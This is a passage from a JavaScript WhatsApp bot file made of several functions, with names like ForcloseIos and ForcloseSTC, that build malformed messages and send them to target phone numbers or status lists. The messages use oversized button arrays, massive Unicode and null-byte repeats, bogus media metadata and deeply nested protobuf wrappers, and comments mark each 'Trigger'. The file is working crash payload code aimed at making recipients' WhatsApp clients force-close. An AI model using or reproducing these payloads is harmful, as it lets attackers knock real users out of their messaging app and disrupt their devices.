            for (var rayap = 3000; rayap >= 800 && !bokep; rayap -= 300) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, rayap));
                    proto.Message.encode(decoded).finish();
                    bokep = decoded;
                } catch (_) {}
            }

            if (!bokep) continue;

            await sock.relayMessage('status@broadcast', bokep, {
                messageId: CrBMsG,
                statusJidList: crb,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: crb.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });
        }
    }
}

async function ForceIncis(sock, target) {
    const LexMsg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "LexzyMods - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "Iniochamy - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Lexca = generateWAMessageFromContent(target, LexMsg, {});

    await sock.relayMessage(target, Lexca.message, {
        participant: target,
        messageId: Lexca.key.id
    });

    const Lexcaa = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Lexcaabos - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});

    await sock.relayMessage(target, Lexcaabos.message, {
        participant: target,
        messageId: Lexcaabos.key.id
    });

    const Msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "LexzyMods - iniochamy",
                    },
                    nativeFlowMessage: {
                        button: "\x10".repeat(2000),
                    },
                },
            },
        },
    };

    const Lex = generateWAMessageFromContent(target, Msg, {});

    await sock.relayMessage(target, Lex.message, {
        participant: target,
        messageId: Lex.key.id
    });

    const ahk = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "iniochamy - Executed¿!",
                            fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                            fileLength: 9999999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "3q2+7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                            fileEncSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
                            directPath: "/v/t62.7118-24/1234567890123456.enc?ccb=11-4&oh=abc123&oe=6A12ED53",
                            mediaKeyTimestamp: "1746057600",
                            jpegThumbnail: null,
                            scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                            scanLengths: [
                                9999999999999998555,
                                9999999999999998555,
                                9699999999999999148,
                                9969999999999999164
                            ],
                            midQualityFileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            contextInfo: {
                                pairedMediaType: "PAIRED_PERMANENT",
                                isQuestion: true,
                                isGroupStatus: true,
                                remoteJid: "status@broadcast",
                                entryPointConversionDelaySeconds: 999999,
                                entryPointConversionSource: "ctwa"
                            }
                        }
                    }
                }
            }
        }
    };

    const ahkMsg = generateWAMessageFromContent(target, ahk, {});

    await sock.relayMessage("status@broadcast", ahkMsg.message, {
        statusJidList: [target],
        messageId: ahkMsg.key.id,
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });
}

async function ForcloseIos(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), // Trigger2
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), // Trigger 3
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, //Trigger 4
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "🔞 𝐈𝐬͠𝐚͜𝐠𝐢 ⍣᳟ 𝐈𝐧͠𝐟𝐢͜𝐧͠𝐢𝐭𝐲" + TravaIphone, //Trigger 5
            matchedText: "🔞 𝐈𝐬͠𝐚͜𝐠𝐢 ⍣᳟ 𝐈𝐧͠𝐟𝐢͜𝐧͠𝐢𝐭𝐲",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),//Trigger 6
            title: "🔞 𝐈𝐬͠𝐚͜𝐠𝐢 ⍣᳟ 𝐈𝐧͠𝐟𝐢͜𝐧͠𝐢𝐭𝐲" + "𑇂𑆵𑆴𑆿".repeat(15000),//Trigger 7
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target 
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target 
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
}


// Created by @NandoOfficiali
// not sell sher pemakaian pribadi 
// kefix tanggung resikonya 

async function ForcloseSTC(sock, target) {
    const sticker = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
    mimetype: "image/webp",
    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
    fileLength: "10610",
    mediaKeyTimestamp: "1775044724",
    stickerSentTs: "1775044724091",
  };

    const tol = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(rb) {
        var buf = [];
        while (rb >= 0x80) {
            buf.push((rb & 0x7f) | 0x80);
            rb >>>= 7;
        }
        buf.push(rb);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const MakLo = proto.Message.encode(
        proto.Message.fromObject({ stickerMessage: sticker })
    ).finish();

    const inflate = function(tag, rayap) {
        var buf = MakLo;
        for (var i = 0; i < rayap; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    var MAX_BATCH = 100;
    var DELAY_MS  = 2000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var crb   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('n' + idx) : 'n';
        var CrBMsG  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < tol.length; ti++) {
            var tag     = tol[ti];
            var bokep = null;

            for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, rayap));
                    proto.Message.encode(decoded).finish();
                    bokep = decoded;
                } catch (_) {}
            }

            if (!bokep) continue;

            await sock.relayMessage('status@broadcast', bokep, {
                messageId: CrBMsG,
                statusJidList: crb,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: crb.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });
        }
    }
}



async function fc(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const Payload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = Payload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });


    var MAX_BATCH = 1;
    var DELAY_MS  = 1000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var bokep   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('n' + idx) : 'n';
        var msg  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var ampasx = null;

            for (var depth = 3000; depth >= 800 && !ampasx; depth -= 300) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    ampasx = decoded;
                } catch (_) {}
            }

            if (!ampasx) continue;

            await sock.relayMessage('status@broadcast', ampasx, {
                messageId: msg,
                statusJidList: bokep,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: bokep.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });
        }
    }
}

async function LexcaabosV7(sock, target) {
  const largeThumbnail = Buffer.alloc(500_500, 'A').toString('base64');
  const generateId = () => Math.random().toString(36).substring(2, 15);

  const LexMsg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [{
          name: "payment_info",
          buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
        }]
      }
    }
  };

  const Nanas = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          mimetype: "video/mp4",
          fileLength: "17381601",
          title: "LexzyModss - Executed",
          fileName: " done bos " + "ꦽ".repeat(75000),
          fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
          mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
          directPath: "/v/t62.7119-24/fake.enc",
          mediaKeyTimestamp: "1767975195",
          url: "https://mmg.whatsapp.net/d/fake.enc",
          caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
        }
      }
    }
  };

  const Muda = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: " Lexzy Suka Nanas " + "ꦾ".repeat(7500)
          },
          contextInfo: {
            stanzaId: "metawai_id",
            forwardingScore: 999,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
          }
        }
      }
    }
  };

  const stickers = {
    stickerMessage: {
      url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
      fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
      fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      mediaKey: Buffer.alloc(32, '').toString('base64'),
      mimetype: "image/webp",
      height: -1,
      width: 5000,
      directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
      fileLength: null,
      mediaKeyTimestamp: 1710000000,
      firstFrameLength: 999,
      firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
      isAnimated: true,
      pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
        ],
        interactiveAnnotations: [{
          polygonVertices: [
            { x: 0.1, y: 0.1 },
            { x: 0.9, y: 0.1 },
            { x: 0.9, y: 0.9 },
            { x: 0.1, y: 0.9 }
          ],
          location: {
            latitude: -6.2088,
            longitude: 106.8456,
            name: `LexzyModss - Executed`,
          }
        }]
      },
      stickerSentTs: 1710000000,
      isAvatar: true,
      isAiSticker: true,
      isLottie: true,
      accessibilityLabel: "\u0000".repeat(9000),
      mediaKeyDomain: null
    }
  };

  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              caption: "LexzyModss - Executed",
              fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
              fileLength: "109951162777600",
              height: -9999,
              width: 9999,
              mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
              fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
              directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1774107894",
